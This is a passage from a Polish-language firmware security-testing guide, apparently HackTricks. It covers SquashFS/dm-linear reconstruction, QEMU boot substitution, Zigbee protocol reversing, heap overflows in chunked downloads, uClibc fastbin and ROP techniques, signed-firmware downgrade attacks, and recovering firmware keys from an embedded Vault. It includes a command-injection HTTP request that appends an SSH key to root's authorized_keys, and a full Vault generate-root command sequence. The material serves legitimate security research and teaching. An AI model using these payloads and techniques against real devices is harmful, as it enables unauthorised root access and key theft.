Jeśli superblok SquashFS jest czytelny, ale przesunięcia inode'ów, katalogów lub tablicy fragmentów są niemożliwe, nie modyfikuj od razu `unsquashfs`. Przeanalizuj wczesny plik binarny rozruchu i odtwórz tworzony przez niego graf urządzeń blokowych: systemy wbudowane mogą udostępniać nominalną partycję root, ale tworzyć rzeczywisty system plików za pomocą mapowania `dm-linear`, które dołącza sektory pobrane z innej partycji. Testy obejmujące wyłącznie superblok mogą przechodzić, nawet gdy wszystkie kolejne bloki metadanych znajdują się w niewłaściwym miejscu.<sup>[[11]](#references)</sup>

Zachowaj dokładnie sposób wykonywania obliczeń przez firmware. Ustal w szczególności, czy długości są wyrażone w bajtach, sektorach 512-bajtowych czy stronach 4 KiB; odtwórz przesunięcia bitowe i obcinanie w pierwotnej kolejności; uwzględnij też zależne od banku obszary końcowe w układach A/B. Na przykład `(partition_bytes >> 12) << 3` najpierw obcina wartość do granicy 4 KiB, a dopiero potem wyraża wynik w sektorach 512-bajtowych; zastąpienie tego przez `partition_bytes // 512` może przesunąć dołączany obszar o kilka kilobajtów i uszkodzić wszystkie dalsze tablice SquashFS.<sup>[[11]](#references)</sup>

Przydatny proces weryfikacji:<sup>[[11]](#references)</sup>

1. Odtwórz z pliku binarnego weryfikatora/init urządzenie źródłowe, sektor początkowy i długość każdego segmentu `dm-linear`.
2. Połącz lub zmapuj obszary bez zmiany zasad ich wyrównania.
3. Jeśli ekstrakcja nadal się nie powiedzie, przeszukaj tylko niewielki obszar wokół przewidywanej granicy i wymagaj kilku kolejnych poprawnych struktur metadanych, zamiast uznawać sam wiarygodnie wyglądający superblok za wystarczający.
4. Uruchom niezmodyfikowany `unsquashfs` na odtworzonym obrazie; poprawne przejście przez wszystkie katalogi i fragmenty jest mocniejszym dowodem niż wynik `unsquashfs -stat`.

#### Zastąpienie dm-verity kontrolowane przez analityka

Gdy analityk kontroluje kernel QEMU, initramfs i dyski wirtualne, zmodyfikowany root można uruchomić, zastępując dostarczony przez producenta proces weryfikacji PID 1 niewielkim, statycznie linkowanym init. To **lab boot-chain substitution**, a nie złamanie dm-verity, jego podpisu RSA, Secure Boot ani klucza zabezpieczonego przez TPM.<sup>[[11]](#references)</sup>

Zastępczy init powinien odzwierciedlać operacyjne elementy pierwotnej ścieżki rozruchu: zamontować `devtmpfs`, wywołać `setsid()`, połączyć `/dev/console` z deskryptorami plików 0–2, zamontować `/proc` i `/sys`, zaczekać na dostarczone urządzenie blokowe, zamontować edytowany root w trybie tylko do odczytu, odłączyć pseud systemy plików starego root, przenieść nowe montowanie na `/`, wykonać `chroot` i uruchomić `execve()` pierwotny plik firmware'u `/sbin/init`. Odłączenie `/dev`, `/proc` i `/sys` **przed** `MS_MOVE` zapobiega przypadkowemu odłączeniu punktów montowania należących do nowego root.<sup>[[11]](#references)</sup>

Oddziel zmienny stan urządzenia od zmodyfikowanego, niezmiennego root. Nakładka qcow2 może zachować stan LVM oryginalnego dysku, a drugi dysk virtio zamontowany tylko do odczytu może udostępniać edytowany SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Debugowanie stanu obrazu offline

Sprawdź trwały stan poza systemem gościa, gdy powolne uruchamianie, destrukcyjne skrypty startowe lub zawodny zapis w konsoli utrudniają ustalenie przyczyny awarii. Nigdy nie podłączaj nakładki używanej przez działającą maszynę wirtualną; udostępnij ją za pomocą `qemu-nbd`, ogranicz wykrywanie LVM do zamierzonej partycji NBD i dezaktywuj grupę woluminów przed jej odłączeniem.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

W celu powtarzalnej izolacji błędów zapisuj pliki znacznikowe z sygnaturą czasową na stabilnym, zapisywalnym woluminie i weryfikuj je offline; `/dev/kmsg`, FIFO i nietrwałe konsole mogą dawać fałszywie ujemne wyniki z powodu ograniczania częstotliwości lub przedwczesnego zakończenia procesu. Przed zmianą niezwiązanych fragmentów kodu porównuj też dokładne interfejsy między warstwami: `uname -r` z `/lib/modules/`, funkcje ext4 na dysku z konfiguracją kernela oraz generację Mesa `libGL` z ABI sterownika DRI i nazwami sterowników wywnioskowanymi z PCI. Komponent może istnieć, a nawet pomyślnie załadować się przez `dlopen()`, a mimo to być bezużyteczny, ponieważ jego użytkownik oczekuje innego ABI.<sup>[[11]](#references)</sup>

## Analiza dynamiczna w praktyce

Na tym etapie do analizy używa się rzeczywistego lub emulowanego środowiska urządzenia. Niezbędne jest zachowanie dostępu do powłoki systemu operacyjnego i systemu plików. Emulacja może nie odwzorowywać idealnie interakcji ze sprzętem, co czasami wymaga ponownego uruchomienia emulatora. Analiza powinna obejmować ponowne sprawdzenie systemu plików, wykorzystanie udostępnionych stron internetowych i usług sieciowych oraz badanie podatności bootloadera. Testy integralności firmware’u mają kluczowe znaczenie dla identyfikacji potencjalnych podatności typu backdoor.

## Techniki analizy w czasie działania

Analiza w czasie działania polega na interakcji z procesem lub plikiem binarnym w jego środowisku operacyjnym, z użyciem narzędzi takich jak gdb-multiarch, Frida i Ghidra do ustawiania punktów przerwania i identyfikowania podatności za pomocą fuzzingu oraz innych technik.

W przypadku celów wbudowanych bez pełnego debuggera **skopiuj na urządzenie statycznie linkowany `gdbserver`** i podłącz się zdalnie:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapowanie komunikatów Zigbee / koprocesora radiowego

W hubach IoT stos RF jest często podzielony między **radio MCU** a proces użytkownika Linux. Przydatny workflow polega na mapowaniu ścieżki:<sup>[[8]](#references)</sup>

1. **Ramka RF** w eterze
2. **Parser po stronie kontrolera** na radio MCU
3. **Tekstowy protokół szeregowy/UART lub TLV** przekazywany do Linux (na przykład `/dev/tty*`)
4. **Dispatcher aplikacji** w głównym demonie
5. **Handler / maszyna stanów specyficzne dla protokołu**

Ta architektura tworzy dwa cele do reverse engineeringu zamiast jednego. Jeśli kontroler konwertuje binarne ramki radiowe na protokół tekstowy, taki jak `Group,Command,arg1,arg2,...`, ustal:

- **Grupy komunikatów** i tabele dispatchera
- Które komunikaty mogą pochodzić z **sieci**, a które z samego kontrolera
- Dokładne **pola rozróżniające specyficzne dla producenta** (na przykład Zigbee `manufacturer_code` i niestandardowe `cluster_command`)
- Które handlery są osiągalne tylko podczas **commissioning**, wykrywania lub pobierania firmware/modelu

W przypadku Zigbee przechwyć ruch podczas parowania i sprawdź, czy urządzenie nadal korzysta z domyślnego **Link Key** `ZigBeeAlliance09`. Jeśli tak, podsłuchanie ruchu commissioning może ujawnić **Network Key**. Kody instalacyjne Zigbee 3.0 ograniczają to zagrożenie, więc odnotuj, czy testowane urządzenie rzeczywiście wymusza ich użycie.

### Handlery protokołów specyficzne dla producenta i osiągalność zależna od FSM

Niestandardowe komendy Zigbee/ZCL dostawcy są często lepszym celem niż standaryzowane klastry, ponieważ trafiają do **niestandardowego kodu parsującego** i wewnętrznych **FSM**, których walidacja jest mniej sprawdzona.<sup>[[8]](#references)</sup>

Praktyczny workflow:

- Analizuj dispatcher komend, aż znajdziesz **handler dostępny wyłącznie dla producenta**.
- Odtwórz tabele **stanów FSM**, **zdarzeń**, **warunków**, **akcji** i **stanów następnych**.
- Zidentyfikuj **stany przejściowe**, które automatycznie przechodzą dalej, oraz gałęzie ponawiania prób/błędów, które ostatecznie resetują lub zwalniają kontrolowany przez atakującego stan.
- Ustal, które prawidłowe wymiany protokołu są wymagane, aby wprowadzić demona w podatny stan, zamiast zakładać, że wadliwy handler jest zawsze osiągalny.

W protokołach wrażliwych na opóźnienia odtwarzanie pakietów z frameworka Python może być zbyt wolne. Bardziej niezawodnym podejściem jest emulowanie prawidłowego urządzenia na rzeczywistym sprzęcie (na przykład **nRF52840**) z użyciem stosu klasy producenckiej, aby można było udostępnić właściwe **endpointy**, **atrybuty** i timing commissioning.

### Klasa błędów w pobieraniu fragmentowanym w daemonach embedded

Powtarzająca się klasa błędów firmware występuje przy **fragmentowanym pobieraniu blobów/modeli/konfiguracji**:<sup>[[8]](#references)</sup>

1. **Pierwszy fragment** (`offset == 0`) zapisuje `ctx->total_size` i alokuje `malloc(total_size)`.
2. Kolejne fragmenty sprawdzają tylko kontrolowane przez atakującego pola **lokalne dla pakietu**, takie jak `packet_total_size >= offset + chunk_len`.
3. Kopiowanie używa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez sprawdzania, czy dane mieszczą się w **pierwotnie zaalokowanym rozmiarze**.

Pozwala to atakującemu wysłać:

- Pierwszy prawidłowy fragment z **małym** zadeklarowanym rozmiarem całkowitym, aby wymusić małą alokację na stercie.
- Późniejszy fragment z **oczekiwanym offsetem**, ale większym `chunk_len`.
- Sfałszowany rozmiar lokalny dla pakietu, który przechodzi nowe kontrole, a mimo to powoduje przepełnienie pierwotnie zaalokowanego bufora.

Jeśli podatna ścieżka jest dostępna dopiero po przejściu logiki commissioning, exploit musi obejmować wystarczającą **emulację urządzenia**, aby wprowadzić cel w oczekiwany stan pobierania modelu lub bloba, zanim zostaną wysłane nieprawidłowe fragmenty.

### Wyzwalanie `free()` przez protokół

W daemonach embedded najprostszym sposobem wywołania eksploatacji metadanych sterty jest często nie „czekanie na czyszczenie”, lecz **wymuszenie obsługi błędu przez sam protokół**:<sup>[[8]](#references)</sup>

- Wyślij nieprawidłowe kolejne fragmenty, aby wprowadzić FSM w stany **ponawiania** lub **błędu**.
- Przekrocz limit ponowień, aby demon **zresetował kontekst** i zwolnił uszkodzony bufor.
- Wykorzystaj to przewidywalne `free()`, aby uruchomić prymitywy po stronie alokatora, zanim proces ulegnie awarii z innych powodów.

Jest to szczególnie przydatne w przypadku alokatorów **musl/uClibc/dlmalloc-podobnych** w embedded Linux, gdzie uszkodzenie metadanych chunków może zamienić logikę unlink/unbin w prymityw zapisu. Stabilnym rozwiązaniem jest uszkodzenie **pola size**, aby przekierować przechodzenie alokatora do **fałszywych chunków przygotowanych wewnątrz przepełnionego bufora**, zamiast od razu nadpisywać rzeczywiste wskaźniki binów i powodować awarię procesu.

## Exploitation binarne i Proof-of-Concept

Tworzenie PoC dla zidentyfikowanych podatności wymaga dogłębnego zrozumienia architektury celu oraz programowania w językach niskiego poziomu. Zabezpieczenia środowiska uruchomieniowego dla plików binarnych są rzadkie w systemach embedded, ale jeśli występują, mogą być konieczne techniki takie jak Return Oriented Programming (ROP).

### Uwagi dotyczące fastbin exploitation w uClibc (embedded Linux)

- **Fastbins + konsolidacja:** uClibc używa fastbinów podobnych do tych w glibc. Późniejsza duża alokacja może wywołać `__malloc_consolidate()`, więc każdy fałszywy chunk musi przejść kontrole (prawidłowy rozmiar, `fd = 0` i sąsiednie chunki uznawane za „zajęte”).<sup>[[6]](#references)</sup>
- **Binarne pliki non-PIE przy ASLR:** jeśli ASLR jest włączony, ale główny plik binarny jest **non-PIE**, adresy `.data/.bss` wewnątrz pliku są stabilne. Można wybrać obszar, który już przypomina prawidłowy nagłówek chunka sterty, aby skierować alokację fastbin do **tablicy wskaźników funkcji**.
- **NUL zatrzymujący parser:** podczas parsowania JSON `\x00` w payloadzie może zatrzymać parsowanie, pozostawiając dalsze bajty kontrolowane przez atakującego do użycia w stack pivot/łańcuchu ROP.
- **Shellcode przez `/proc/self/mem`:** łańcuch ROP wywołujący `open("/proc/self/mem")`, `lseek()` i `write()` może umieścić wykonywalny shellcode w znanym mapowaniu i przekazać do niego sterowanie.

## Przygotowane systemy operacyjne do analizy firmware

Systemy operacyjne takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) udostępniają wstępnie skonfigurowane środowiska do testowania bezpieczeństwa firmware, wyposażone w niezbędne narzędzia.

## Przygotowane systemy OS do analizy firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS to dystrybucja przeznaczona do przeprowadzania oceny bezpieczeństwa i penetration testing urządzeń Internetu rzeczy (IoT). Oszczędza dużo czasu, udostępniając wstępnie skonfigurowane środowisko ze wszystkimi niezbędnymi narzędziami.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): system operacyjny do testowania bezpieczeństwa embedded, oparty na Ubuntu 18.04 i wyposażony we wstępnie zainstalowane narzędzia do testowania bezpieczeństwa firmware.

## Ataki downgrade firmware i niezabezpieczone mechanizmy aktualizacji

Nawet gdy producent wdraża kryptograficzne sprawdzanie podpisów obrazów firmware, **ochrona przed przywróceniem starszej wersji (downgrade) jest często pomijana**. Jeśli bootloader lub loader odzyskiwania weryfikuje jedynie podpis za pomocą wbudowanego klucza publicznego, ale nie sprawdza *wersji* (ani licznika monotonicznego) wgrywanego obrazu, atakujący może legalnie zainstalować **starszy, podatny firmware z prawidłowym podpisem**, ponownie wprowadzając załatane podatności.<sup>[[4]](#references)</sup>

Typowy przebieg ataku:

1. **Zdobądź starszy podpisany obraz**
   * Pobierz go z publicznego portalu pobierania producenta, CDN lub strony wsparcia.
   * Wyodrębnij go z powiązanych aplikacji mobilnych/desktopowych (np. z katalogu `assets/firmware/` w Android APK).
   * Znajdź go w repozytoriach zewnętrznych, takich jak VirusTotal, archiwa internetowe, fora itd.
2. **Prześlij obraz do urządzenia lub udostępnij go urządzeniu** przez dowolny dostępny kanał aktualizacji:
   * Interfejs WWW, API aplikacji mobilnej, USB, TFTP, MQTT itd.
   * Wiele konsumenckich urządzeń IoT udostępnia nieuwierzytelnione endpointy HTTP(S), które przyjmują bloby firmware zakodowane w Base64, dekodują je po stronie serwera i uruchamiają procedurę odzyskiwania/aktualizacji.
3. Po downgrade wykorzystaj podatność, która została załatana w nowszym wydaniu (na przykład filtr command injection dodany później).
4. Opcjonalnie wgraj ponownie najnowszy obraz lub wyłącz aktualizacje, aby uniknąć wykrycia po uzyskaniu persistence.

### Przykład: Command Injection po downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

W podatnym (obniżonym do starszej wersji) firmware parametr `md5` jest bezpośrednio łączony z poleceniem powłoki bez oczyszczania, co umożliwia wstrzyknięcie dowolnych poleceń (w tym przypadku — włączenie dostępu root przy użyciu klucza SSH). W późniejszych wersjach firmware wprowadzono podstawowy filtr znaków, ale brak ochrony przed downgrade’em sprawia, że poprawka jest nieskuteczna.<sup>[[4]](#references)</sup>

### Wyodrębnianie firmware z aplikacji mobilnych

Wielu dostawców dołącza pełne obrazy firmware do towarzyszących im aplikacji mobilnych, aby aplikacja mogła aktualizować urządzenie przez Bluetooth/Wi-Fi. Pakiety te są zwykle przechowywane bez szyfrowania w plikach APK/APEX, w ścieżkach takich jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra`, a nawet zwykłe `unzip` pozwalają pobrać podpisane obrazy bez dostępu do fizycznego sprzętu.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Obejście anti-rollback ograniczonego do updatera w projektach ze slotami A/B

Niektórzy dostawcy implementują **ratchet** chroniący przed downgrade’em, ale wyłącznie w logice *updatera* (na przykład w procedurze UDS przez CAN, komendzie recovery albo agencie OTA w userspace). Jeśli **bootloader** sprawdza później tylko podpis/CRC obrazu i ufa tablicy partycji lub metadanym slotu, ochronę przed rollbackiem nadal można ominąć.<sup>[[7]](#references)</sup>

Typowy słaby projekt:

- Metadane firmware zawierają zarówno deskryptor wersji, jak i **ratchet bezpieczeństwa** / licznik monotoniczny.
- Updater porównuje ratchet obrazu z wartością zapisaną w pamięci trwałej i odrzuca starsze, podpisane obrazy.
- Bootloader **nie** analizuje tego ratcheta i przed uruchomieniem wybranego slotu weryfikuje tylko nagłówek, CRC i podpis.
- Aktywacja slotu jest zapisywana osobno — w tablicy partycji lub liczniku generacji dla danego slotu — i **nie jest kryptograficznie powiązana** z dokładnym hashem zweryfikowanego firmware.

W systemach z dwoma slotami pozwala to zastosować prymityw **zweryfikuj jeden obraz / uruchom inny obraz**. Jeśli atakujący może sprawić, że updater oznaczy slot B jako następny cel rozruchu, używając aktualnego, podpisanego obrazu, a następnie nadpisać slot B przed ponownym uruchomieniem, bootloader może nadal uruchomić starszy obraz, ponieważ ufa jedynie wcześniej zatwierdzonym metadanym slotu.

Typowy schemat nadużycia:

1. Wgraj **aktualny, podpisany** firmware do nieaktywnego slotu i uruchom standardową procedurę weryfikacji/przełączania, aby układ oznaczył ten slot jako następny aktywny.
2. **Jeszcze nie uruchamiaj ponownie**. W tej samej sesji ponownie wywołaj procedurę przygotowania/wymazywania slotu.
3. Wykorzystaj nieaktualny stan rozruchu lub nieaktualną logikę wyboru slotu, aby updater skasował **ten sam fizyczny slot**, który właśnie został aktywowany.
4. Zapisz w tym slocie **starszy, ale nadal podpisany** firmware.
5. Pomiń procedurę weryfikacji, która egzekwuje ratchet, i uruchom urządzenie ponownie bezpośrednio.
6. Bootloader wybiera aktywowany slot, weryfikuje tylko podpis/integralność i uruchamia stary obraz.

Podczas analizy implementacji aktualizacji A/B zwróć uwagę na:

- Wybór slotu na podstawie **flag z momentu rozruchu**, które nie są odświeżane po udanym przełączeniu.
- Procedurę w rodzaju `prepare_passive_slot()`, która kasuje slot na podstawie nieaktualnego stanu zamiast **aktualnego, zatwierdzonego układu**.
- Funkcję w rodzaju `part_write_layout()`, która jedynie zwiększa **licznik generacji** / ustawia flagę aktywności, ale nie zapisuje hasha zweryfikowanego obrazu.
- Kontrole ratcheta zaimplementowane w userspace lub kodzie updatera, ale **nie** w ROM / bootloaderze / etapach secure boot.
- Procedury kasowania lub recovery, które pozostawiają slot oznaczony jako rozruchowy nawet po usunięciu i ponownym zapisaniu jego zawartości.

### Lista kontrolna oceny logiki aktualizacji

* Czy transport/uwierzytelnianie *endpointu aktualizacji* jest odpowiednio zabezpieczone (TLS + uwierzytelnianie)?
* Czy urządzenie porównuje **numery wersji** lub **monotoniczny licznik anti-rollback** przed flashowaniem?
* Czy obraz jest weryfikowany w ramach łańcucha secure boot (np. podpisy sprawdza kod ROM)?
* Czy **bootloader egzekwuje ten sam ratchet** co updater, zamiast sprawdzać tylko podpis/CRC?
* Czy metadane aktywacji slotu są **powiązane ze zweryfikowanym hashem/wersją firmware**, czy slot można zmodyfikować po jego aktywowaniu?
* Czy po pomyślnym przełączeniu slotu urządzenie musi się ponownie uruchomić, czy też w tej samej sesji nadal można wywołać kolejne procedury aktualizacji/kasowania?
* Czy kod w userlandzie wykonuje dodatkowe kontrole poprawności (np. dozwolone mapowanie partycji, numer modelu)?
* Czy przepływy aktualizacji *częściowej* lub *zapasowej* korzystają z tej samej logiki weryfikacji?

> 💡  Jeśli brakuje któregokolwiek z powyższych elementów, platforma jest prawdopodobnie podatna na ataki rollback.

## Podatny firmware do ćwiczeń

Aby poćwiczyć wykrywanie podatności w firmware, zacznij od poniższych projektów podatnego firmware.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Odzyskiwanie kluczy deszyfrujących firmware ze stanu wbudowanego KMS/Vault

Gdy obraz aktualizacji łączy niewielką ilość metadanych w postaci jawnej z dużym blobem o wysokiej entropii, przed próbami brute-force przeanalizuj kontener:<sup>[[1]](#references)</sup>

- Zrzutuj nagłówki, przesunięcia i granice wierszy za pomocą `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` zwykle oznacza format OpenSSL `enc`: następne 8 bajtów to sól, a pozostałe bajty to szyfrogram.
- Pole Base64, które po dekodowaniu ma dokładnie `256` bajtów, mocno sugeruje szyfrogram RSA-2048, którym zaszyfrowano losowe hasło firmware/klucz sesji.
- Dołączony w tym samym pliku materiał PGP często służy wyłącznie do potwierdzania autentyczności; nie zakładaj, że zapewnia poufność.

Jeśli poszukiwanie kluczy statycznych (`grep`, `strings`, wyszukiwanie PEM/PGP) nie przynosi rezultatów, przeanalizuj **ścieżkę deszyfrowania w działaniu**, zamiast szukać wyłącznie kluczy prywatnych:

- Zdekompiluj updater / binarny program zarządzający i prześledź, który komponent odczytuje zaszyfrowany blob, która funkcja pomocnicza/API go odpakowuje oraz jakiej logicznej nazwy klucza żąda.
- Przeszukaj wyodrębniony główny system plików w poszukiwaniu stanu KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) oraz plików jednostek i skryptów init.
- Traktuj jawny tekst `vault operator unseal ...`, klucze odzyskiwania, tokeny bootstrap lub lokalne skrypty automatycznego odpieczętowywania KMS jako odpowiedniki materiału klucza prywatnego.

Jeśli urządzenie zawiera oryginalny plik binarny Vault i backend magazynu, odtworzenie tego środowiska jest zwykle łatwiejsze niż ponowna implementacja wewnętrznych mechanizmów Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Mając uprawnienia root w sklonowanym KMS:

- Ustaw klucze transit jako eksportowalne wyłącznie w odizolowanej kopii: `vault write transit/keys/<name>/config exportable=true`
- Wyeksportuj klucz unwrap: `vault read transit/export/encryption-key/<name>`
- Wypróbuj odzyskany klucz RSA z dokładną parą padding/hash używaną przez KMS. Nieudane odszyfrowanie PKCS#1 v1.5 i nieudane odszyfrowanie domyślnym OAEP **nie** dowodzą, że klucz jest nieprawidłowy; wiele procesów opartych na Vault używa OAEP z SHA-256, podczas gdy popularne biblioteki domyślnie używają SHA-1.
- Jeśli payload zaczyna się od `Salted__`, dokładnie odtwórz KDF OpenSSL używany przez producenta (`EVP_BytesToKey`, często MD5 w starszych urządzeniach), zanim podejmiesz próbę odszyfrowania AES-CBC.

W ten sposób problem „zaszyfrowanego firmware’u” staje się bardziej ogólny: **odzyskaj klucze operacyjne po stronie urządzenia, a następnie odtwórz dokładne parametry unwrap + KDF offline**.

## Szkolenia i certyfikaty

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Cracking firmware’u z Claude: umiejętności na poziomie seniora, autonomia na poziomie juniora](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodyka testowania bezpieczeństwa firmware’u](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktyczny hacking IoT: kompletny przewodnik po atakowaniu Internetu rzeczy](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Wykorzystywanie zero-dayów w porzuconym sprzęcie – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jak inteligentne urządzenie za 20 dolarów dało mi dostęp do Twojego domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Teraz widzisz mi: teraz jesteś Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv — Wykorzystywanie Tesla Wall Connector przez złącze portu ładowania — część 2: omijanie zabezpieczenia przed downgrade’em](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Niech zamiga: zdalne wykorzystywanie Philips Hue Bridge przez OTA](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS na QEMU, część 1: rozpakowywanie](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Dokumentacja jądra Linux — dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS na QEMU, część 2: debugowanie i naprawianie](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Hasła do BIOS-u firmy Dell: słabe szyfrowanie XOR umożliwia odzyskanie danych z pamięci SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn — narzędzia do odzyskiwania haseł do BIOS-u firmy Dell](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Odświeżenie wiedzy o hardware hackingu, część 2](https://voidstarsec.com/blog/brushing-up-part-2)
- [15] [Jak i dlaczego zhakowaliśmy hardware’owy portfel Cypherock: pełna historia](https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/)
{{#include ../../banners/hacktricks-training.md}}
